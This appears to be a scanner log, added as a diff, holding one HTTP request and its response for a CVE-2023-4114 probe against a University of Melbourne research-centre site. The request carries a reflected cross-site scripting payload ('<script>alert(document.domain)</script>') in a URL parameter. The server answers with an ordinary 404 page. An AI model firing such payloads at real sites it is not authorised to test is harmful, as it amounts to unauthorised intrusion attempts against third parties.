@@ -1,0 +1,368 @@
+[CVE-2023-4114] Dumped HTTP request for https://petercook.unimelb.edu.au/index.php?controller=pjFront&action=pjActionSearch&session_id&locale=1&index=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&date
+
+
+GET /index.php?controller=pjFront&action=pjActionSearch&session_id&locale=1&index=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&date HTTP/1.1
+Host: petercook.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Connection: close
+Accept: */*
+Accept-Language: en
+Accept-Encoding: gzip
+
+
+[CVE-2023-4114] Dumped HTTP response https://petercook.unimelb.edu.au/index.php?controller=pjFront&action=pjActionSearch&session_id&locale=1&index=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&date
+
+HTTP/1.1 404 Not Found
+Connection: close
+Transfer-Encoding: chunked
+Access-Control-Allow-Origin: cms.unimelb.edu.au
+Cache-Control: max-age=0, private
+Content-Type: text/html; charset=utf-8
+Date: Wed, 06 Aug 2025 15:18:10 GMT
+Expires: Wed, 06 Aug 2025 15:18:06 GMT
+Pragma: cache
+Server: openresty
+Set-Cookie: SQ_SYSTEM_SESSION=40705a8438d502502c1019bd6f66d19d; path=/; HttpOnly
+Vary: Accept-Encoding
+Vary: Accept-Encoding
+Vary: Origin
+Via: 1.1 squizedge.net
+X-Cache: MISS from squizedge.net
+X-Content-Type-Options: nosniff
+X-Request-Id: 8a1a6d09-5364-4d5a-bae1-586412c46a0e
+X-Upgrade-Enabled: off
+
+
+
+
+
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+
+
+<meta charset="utf-8">
+<meta content="width=device-width, initial-scale=1.0" name="viewport">
+<meta content="IE=edge" http-equiv="X-UA-Compatible">
+<link rel="icon" href="/__data/assets/image/0012/4587591/favicon.png">
+<title>Page not found</title>
+<!--
+Website maintained by: pcc-ccs@unimelb.edu.au
+Last updated by: Jimmy Porich on 23 Apr 2018 1:12pm
+Last published by: Jimmy Porich on 23 Apr 2018 1:12pm
+System: MCE Gen3
+    This website uses the centrally managed Design and Content Management System.  
+    https://www.unimelb.edu.au/web
+    Asset ID: #2754539
+
+-->
+
+<meta name="title" content="Page not found">
+<meta name="description" content="Page not found">
+<meta name="last-modified" content="2018-04-23">
+
+<meta name="robots" content="index, follow">
+<meta name="robots" content="noodp">
+<link rel="canonical" href="https://petercook.unimelb.edu.au/404">
+<meta name="geo.placename" content="Victoria, Australia, Oceania, World">
+<meta name="geo.region" content="AU">
+<meta name="geo.client.location" content="US">
+<meta name="google-site-verification" content="14L1qmSifouVkhuHJ_bjLKfy8ySshqb5pHTkKOiSI6Q">
+<meta name="msvalidate.01" content="0F1033BC88958D439A8B529D66FCD079">
+
+
+<meta name="DC.Creator" content="Jimmy Porich">
+<meta name="DC.Date" content="23 Apr 2018 1:12pm">
+<meta name="MCE.Template" content="Inside page with no header">
+<meta name="MCE.Paintlayout" content="Page layout 1385754">
+
+
+<meta property="og:type" content="website">
+<!--<meta property="fb:app_id" content="933889623386823">-->
+<meta property="og:url" content=" https://petercook.unimelb.edu.au/404">
+<meta property="og:title" content="Page not found">
+<meta property="og:description" content="Page not found">
+<meta property="og:site_name" content="The Peter Cook Centre for CCS Research">
+<meta property="og:locale" content="en_US">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:site" content="@unimelb">
+<meta name="twitter:title" content="Page not found">
+<meta name="twitter:description" content="Page not found">
+<!-- og:image and twitter:image needs to be set on details screen to appear here -->
+
+  
+
+  
+ 
+        
+        
+        
+        
+        <link rel="stylesheet" href="//dds-gen3.web.unimelb.edu.au/v15.8.2/uom.css">
+        <script src="//dds-gen3.web.unimelb.edu.au/v15.8.2/uom.js"></script> 
+    
+
+  
+
+ 
+ 
+	
+	<link rel="stylesheet" href="https://cms.unimelb.edu.au/__data/assets/css_file_folder/0008/3224951/uom-mce-gen3.css?v=1.0.103">
+
+
+<script type="module" src="https://dds-gen3.web.unimelb.edu.au/ui-core-web-components/v0.0.1/modular/client/mega-menu.js"></script><!-- custom head extras start -->
+
+<!-- custom head extras end -->
+<!--
+  Running Squiz Matrix
+  Developed by Squiz - http://www.squiz.net
+  Squiz, Squiz Matrix, MySource, MySource Matrix and Squiz.net are registered Trademarks of Squiz Pty Ltd
+  Page generated: 07 August 2025 01:18:07
+-->
+
+
+</head>
+<body class="">
+  
+<div class="skip-link">
+      <a href="#main-content" class="skip-link__anchor" data-no-scroll>
+        Skip to main content
+      </a>
+    </div>
+
+<div class="uomcontent" role="document">
+    <div class="page-inner">
+        
+        
+  
+                            <ol class="page-local-history" itemscope="" itemtype="https://schema.org/BreadcrumbList">
+                    <li class="root" itemprop="itemListElement" itemscope="" itemtype="https://schema.org/ListItem">
+                        <a href="https://petercook.unimelb.edu.au" itemprop="item"><span itemprop="name">The Peter Cook Centre for CCS Research</span></a>
+                        <meta content="1" itemprop="position">
+                    </li>
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                                            <li itemprop="itemListElement" itemscope="" itemtype="https://schema.org/ListItem">
+                           <a href="https://petercook.unimelb.edu.au/404" itemprop="item"><span itemprop="name">404</span></a>
+                           <meta content="2" itemprop="position">
+                        </li>
+                                    </ol>
+                    
+
+        
+        
+                
+        
+        <div class='main' id='main-content' role='main'>
+            
+
+ 
+
+    
+           
+
+                    <h1 class="aligned-title">Page not found</h1>
+        
+         
+    	        	    
+
+        
+<div class="content-block" id="new_content_container_1938144_1938144">
+  <p>We are sorry, but we can't find the page you are looking for.<br>It may have been moved, or deleted.</p>
+
+  <h3>What now?</h3>
+  <ul>
+    <li>
+      <span style="display:inline">It looks like you came directly here, either by typing the address, or following a bookmark. Check the address to be sure.</span>
+      <span style="display:none">Return to the <a href="">page you were on</a></span>
+    </li>
+    <li>Try starting from the <a href="https://petercook.unimelb.edu.au">home page</a></li>
+    <li>Try <a href="http://search.unimelb.edu.au/?q=*+site:petercook.unimelb.edu.au">searching pages on this site</a></li>
+    <li><a data-modal-target="report-modal" href="#report">Report this problem</a></li>
+    <li>Enjoy the quotation below from one of the remarkable people associated with The University of Melbourne.</li>
+  </ul>
+
+
+</div>
+<div class="modal__dialog" id="report-modal">
+  <a class="modal__close">Close</a>
+  
+    <form id="form_email_1890286" enctype="multipart/form-data" action="https://cms.unimelb.edu.au/central-site-management/forms/404" method="post">
+      <input type="hidden" name="SQ_FORM_1890286_PAGE" id="SQ_FORM_1890286_PAGE" value="1" >
+      <input type="hidden" id="q1890286_q2" name="q1890286:q2" value="" >
+      <input type="hidden" id="q1890286_q4" name="q1890286:q4" value="https://petercook.unimelb.edu.au">
+      <input type="hidden" id="q1890286_q5" name="q1890286:q5" value="/index.php">
+      <input type="hidden" id="q1890286_q6" name="q1890286:q6" value="pcc-ccs@unimelb.edu.au">
+    
+        <h1 id="report">Problem report</h1>
+        <div>
+            <p>We've captured some technical details.</p>
+            <pre>You came from: Direct<br>You asked for: <span>https</span>://<span>petercook.unimelb.edu.au</span><span>/index.php</span></pre>
+        </div>
+        
+       <fieldset>
+          <legend>Optional details</legend>
+          <div>
+            <label for="q1890286_q1">Email. <em>If you'd like a reply, we'll need your email address </em>:</label>
+            <input name="q1890286:q1" value="" size="30" maxlength="300" placeholder="you@somewhere.org" id="q1890286_q1" type="text">
+          </div>
+          <div>
+            <label for="q1890286_q3">Comments. <em>Anything else you'd like to tell us? </em>:</label>
+            <textarea name="q1890286:q3" cols="30" rows="3" placeholder="Any more useful details" id="q1890286_q3"></textarea>
+          </div>
+          <input type="text" name="honeypot" value="" size="10" maxlength="10" class="hidden" id="honeypot" title="If you are a human, do not fill in this field.">
+        </fieldset>
+        
+        <footer>
+          <input name="form_email_1890286_submit" value="Submit" id="form_email_1890286_submit" type="submit" class="button"  />
+        </footer>
+    
+    </form>
+</div>  <section class="bg-alt">
+    <blockquote class="blockquote-classic">
+		<p>Our ancestors have left us an unpaid debt to these people, and we must make a special effort to carry out our responsibilities, not with any spirit of "doing good", but as a duty long neglected.</p>
+		<p><cite>Shirley Andrews : as Honorary Secretary of the Council for Aboriginal Rights in Victoria</cite></p>
+    </blockquote>
+
+  </section><script src="//ajax.googleapis.com/ajax/libs/jquery/1/jquery.min.js"></script>
+<script>
+
+var eventposted=0;
+
+$(document).ready(function(){
+ $('input.button').click(function() {
+   window.setInterval(redirect, 100);
+ });
+});
+
+function redirect(){
+ if(($(".modal__dialog").is(':visible')) && (eventposted==0)){
+   window.location = "https://petercook.unimelb.edu.au/404/reported";
+   eventposted=1;
+ }
+}
+
+</script>
+
+    
+
+
+
+
+            
+            <!-- custom site footer start -->
+
+<!-- custom site footer end -->
+
+
+            
+        </div>
+        
+
+ 
+    
+ 
+         
+    <!-- has menu -->
+    <div id="sitemap" role="navigation" data-absolute-root="https://petercook.unimelb.edu.au" class="new-site-menu">
+    <!-- site nav with meta menu --><!--googleoff: all-->
+    <h2>The Peter Cook Centre for CCS Research</h2><ul><!-- L1 default -->
+<li><a href="https://petercook.unimelb.edu.au/home">Home</a><ul><!-- L2 default -->
+<li><a href="https://petercook.unimelb.edu.au/home/home">&lt;span data-size=&quot;md&quot; data-icon=&quot;home&quot; title=&quot;home&quot;&gt;Home&lt;/span&gt;</a></li><!-- L2 default -->
+<li><a href="https://petercook.unimelb.edu.au/home/about-us">About us</a></li><!-- L2 default -->
+<li><a href="https://petercook.unimelb.edu.au/home/research">Research</a></li><!-- L2 default -->
+<li><a href="https://petercook.unimelb.edu.au/home/reports">Reports</a></li><!-- L2 default -->
+<li><a href="https://petercook.unimelb.edu.au/home/people">People</a></li><!-- L2 default -->
+<li><a href="https://petercook.unimelb.edu.au/home/contact-us">Contact us</a></li></ul></li><!-- L1 default -->
+<li><a href="https://petercook.unimelb.edu.au/about">About us</a><ul><!-- L2 default -->
+<li><a href="https://petercook.unimelb.edu.au/about/governance">Governance</a></li><!-- L2 default -->
+<li><a href="https://petercook.unimelb.edu.au/about/collaborations">Collaborations</a><ul><!-- L3 redirect -->
+
+<li><a href="http://www.co2crc.com.au/">C02CRC</a>
+</li></ul></li><!-- L2 default -->
+<li><a href="https://petercook.unimelb.edu.au/about/project-collaborators">Project collaborators</a></li><!-- L2 default -->
+<li><a href="https://petercook.unimelb.edu.au/about/executive-team">Executive team</a><ul><!-- L3 default -->
+<li><a href="https://petercook.unimelb.edu.au/about/executive-team/management-structure">Management structure</a></li></ul></li><!-- L2 default -->
+<li><a href="https://petercook.unimelb.edu.au/about/centre-advisory-board">Centre Advisory Board</a></li></ul></li><!-- L1 default -->
+<li><a href="https://petercook.unimelb.edu.au/research">Research</a><ul><!-- L2 default -->
+<li><a href="https://petercook.unimelb.edu.au/research/carbon-capture">Carbon capture</a><ul><!-- L3 default -->
+<li><a href="https://petercook.unimelb.edu.au/research/carbon-capture/solvents">Solvents</a></li><!-- L3 default -->
+<li><a href="https://petercook.unimelb.edu.au/research/carbon-capture/adsorbents">Adsorbents</a></li><!-- L3 default -->
+<li><a href="https://petercook.unimelb.edu.au/research/carbon-capture/membranes">Membranes</a></li></ul></li><!-- L2 default -->
+<li><a href="https://petercook.unimelb.edu.au/research/carbon-storage">Carbon storage</a><ul><!-- L3 default -->
+<li><a href="https://petercook.unimelb.edu.au/research/carbon-storage/reservoir-engineering">Reservoir Engineering</a></li><!-- L3 default -->
+<li><a href="https://petercook.unimelb.edu.au/research/carbon-storage/geochemistry">Geochemistry</a></li><!-- L3 default -->
+<li><a href="https://petercook.unimelb.edu.au/research/carbon-storage/geomicrobiology">Geomicrobiology</a></li><!-- L3 default -->
+<li><a href="https://petercook.unimelb.edu.au/research/carbon-storage/basin-analysis-and-modelling">Basin Analysis &amp; Modelling</a></li><!-- L3 default -->
+<li><a href="https://petercook.unimelb.edu.au/research/carbon-storage/atmospheric-monitoring">Atmospheric Monitoring</a></li><!-- L3 default -->
+<li><a href="https://petercook.unimelb.edu.au/research/carbon-storage/seismology">Seismology</a></li></ul></li></ul></li><!-- L1 default -->
+<li><a href="https://petercook.unimelb.edu.au/staff">People</a><ul><!-- L2 default -->
+<li><a href="https://petercook.unimelb.edu.au/staff/executive-team">Executive </a></li><!-- L2 default -->
+<li><a href="https://petercook.unimelb.edu.au/staff/researchers">Researchers</a><ul><!-- L3 default -->
+<li><a href="https://petercook.unimelb.edu.au/staff/researchers/geochemistry-team">Geochemistry team</a></li><!-- L3 default -->
+<li><a href="https://petercook.unimelb.edu.au/staff/researchers/reservoir-engineering-team">Reservoir Engineering team</a></li><!-- L3 default -->
+<li><a href="https://petercook.unimelb.edu.au/staff/researchers/basin-analysis-and-modelling-team">Basin Analysis &amp; Modelling team</a></li><!-- L3 default -->
+<li><a href="https://petercook.unimelb.edu.au/staff/researchers/atmospheric-modelling-team">Atmospheric Modelling team</a></li><!-- L3 default -->
+<li><a href="https://petercook.unimelb.edu.au/staff/researchers/seismology-team">Seismology Team</a></li><!-- L3 default -->
+<li><a href="https://petercook.unimelb.edu.au/staff/researchers/solvents-team">Solvents team</a></li><!-- L3 default -->
+<li><a href="https://petercook.unimelb.edu.au/staff/researchers/adsorbents-team">Adsorbents team</a></li><!-- L3 default -->
+<li><a href="https://petercook.unimelb.edu.au/staff/researchers/membrane-systems-team">Membrane Systems team</a></li></ul></li><!-- L2 default -->
+<li><a href="https://petercook.unimelb.edu.au/staff/professional-staff">Professional Staff</a></li><!-- L2 default -->
+<li><a href="https://petercook.unimelb.edu.au/staff/students">Professional Staff and Associates</a></li><!-- L2 default -->
+<li><a href="https://petercook.unimelb.edu.au/staff/affiliates">Affiliates</a></li></ul></li><!-- L1 default -->
+<li><a href="https://petercook.unimelb.edu.au/publications-and-reports">Reports</a><ul><!-- L2 default -->
+<li><a href="https://petercook.unimelb.edu.au/publications-and-reports/annual-reports">Annual Reports</a></li><!-- L2 default -->
+<li><a href="https://petercook.unimelb.edu.au/publications-and-reports/active-carbon-storage-projects">Active Carbon Storage Projects</a></li><!-- L2 default -->
+<li><a href="https://petercook.unimelb.edu.au/publications-and-reports/active-carbon-capture-projects">Active Carbon Capture Projects</a></li><!-- L2 default -->
+<li><a href="https://petercook.unimelb.edu.au/publications-and-reports/publications">Publications</a></li><!-- L2 default -->
+<li><a href="https://petercook.unimelb.edu.au/publications-and-reports/capabilities-and-expertise">Capabilities &amp; Expertise</a></li></ul></li><!-- L1 default -->
+<li><a href="https://petercook.unimelb.edu.au/news-and-opinions">News &amp; opinions</a><ul><!-- L2 default -->
+<li><a href="https://petercook.unimelb.edu.au/news-and-opinions/distinguished-lecture-series">Distinguished Lecture Series</a></li><!-- L2 default -->
+<li><a href="https://petercook.unimelb.edu.au/news-and-opinions/monthly-seminars">Monthly seminars</a></li><!-- L2 default -->
+<li><a href="https://petercook.unimelb.edu.au/news-and-opinions/past-events">Past events</a></li></ul></li><!-- L1 default -->
+<li><a href="https://petercook.unimelb.edu.au/contact-us">Contact us</a></li></ul><ul class="meta">
+    
+    <li><a href="//students.unimelb.edu.au/?in_c=ham">Current Students</a></li>
+    <li><a href="//library.unimelb.edu.au/?in_c=ham">Library</a></li>
+    <li><a href="//staff.unimelb.edu.au/?in_c=ham">Staff</a></li>
+</ul>
+<!--googleon: all-->
+</div>
+     
+
+
+
+    </div>
+</div>
+<!-- global after body -->
+<script>
+window.utag_data = window.utag_data || {};
+window.utag_data.platform = "matrix-controlled-environment";
+</script>
+
+
+<script async="async" src="https://static.srcspot.com/libs/leonore.js"></script>
+
+    
+
+
+
+<script defer src="https://cms.unimelb.edu.au/__data/assets/js_file/0010/5214367/analyticsUoM.js?v=0.1.3"></script>
+<!-- custom after body start -->
+
+<!-- custom after body end  -->
+
+</body>
+</html>
+
+
